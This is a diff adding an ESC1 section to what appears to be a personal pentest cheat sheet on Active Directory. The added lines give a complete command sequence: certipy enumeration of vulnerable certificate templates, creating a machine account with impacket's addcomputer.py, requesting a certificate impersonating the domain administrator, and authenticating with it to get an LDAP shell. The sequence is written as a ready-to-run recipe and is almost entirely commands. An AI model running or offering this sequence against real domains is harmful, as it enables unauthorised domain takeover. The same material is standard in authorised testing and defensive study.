@@ -9,6 +9,35 @@ title: Active Directory
 - [impacket](https://github.com/fortra/impacket)
 - [certipy](https://github.com/ly4k/Certipy)
 
+## Certificate Authority stuff
+
+```bash
+certipy-ad find -u my_user -p my_password123 -dc-ip 10.10.10.10
+```
+
+In the `.txt` file, look for:
+```bash
+# Template Name                       : ESC1
+# Display Name                        : Escee 1
+# Certificate Authorities             : COMPANY-CA
+# ...
+Enabled                             : True
+Enrollee Supplies Subject           : True
+Enrollment Rights                   : Company.org\Domain Computers
+Enrollment Rights                   : Company.org\Domain Users
+```
+
+### Enrollment Rights Domain Computers
+```bash
+python addcomputer.py company.org/my_user:'my_password123' -dc-ip 10.10.10.10 -computer-name "newcomputer1" -computer-pass 'newpass1'
+```
+```bash
+certipy-ad req -username 'newcomputer1$' -password 'newpass1' -ca 'COMPANY-CA' -target 10.10.10.10 -template 'ESC1' -upn "administrator@company.org" -dns dns.company.org
+```
+```bash
+certipy-ad auth -pfx administrator_company.pfx -dc-ip 10.10.10.10 -ldap-shell
+```
+
 ## Vulnerable Certificate Authority Access Control - ESC7
 - [Hacktricks ESC7](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#vulnerable-certificate-authority-access-control-esc7)
 ```bash
